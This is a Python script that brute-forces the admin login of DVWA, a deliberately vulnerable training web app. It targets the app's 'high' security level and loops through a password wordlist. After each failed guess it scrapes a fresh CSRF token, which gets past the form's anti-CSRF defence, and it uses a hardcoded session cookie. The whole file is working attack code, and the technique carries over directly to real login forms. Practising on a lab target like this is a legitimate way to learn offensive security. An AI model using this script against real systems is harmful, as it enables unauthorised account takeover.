#!/usr/bin/python

import requests
from bs4 import BeautifulSoup as Soup


def check(html):
    if not Soup(html, features="lxml").findAll(text=success_message):
        success = False
    else:
        success = True
    return success


filename = 'pass.txt'
success_message = 'Welcome to the password protected area admin'
txt = open(filename)
url = 'http://dvwa.local/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': 'enie144l9b54hrcf7km7as2uav'}
csrf_token = Soup(requests.Session().get(url, cookies=cookie).text, features="lxml").findAll(attrs={"name": "user_token"})[0].get('value')
with open(filename) as f:
    print('Starting brute force...')
    for password in f:
        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
        success = check(requests.Session().get(url, cookies=cookie, params=payload).text)
        if not success:
            csrf_token = Soup(requests.Session().get(url, cookies=cookie, params=payload).text, features="lxml").findAll(attrs={"name": "user_token"})[0].get('value')
        else:
            print('Password: ' + password)
            break
    if not success:
        print('Brute force failed')
